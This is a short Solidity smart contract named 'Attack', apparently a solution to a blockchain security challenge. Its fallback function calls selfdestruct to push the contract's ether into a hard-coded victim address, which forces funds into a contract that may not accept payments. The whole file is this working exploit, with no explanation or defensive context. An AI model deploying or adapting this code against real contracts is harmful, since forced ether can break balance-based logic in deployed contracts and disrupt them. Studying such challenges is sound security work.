// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address victim = 0x8425C3e3497820Ec107eF55171ADBa1EE65E6E81;
    fallback() external payable {
        address payable addr = payable(address(victim));
        selfdestruct(addr);
    }
}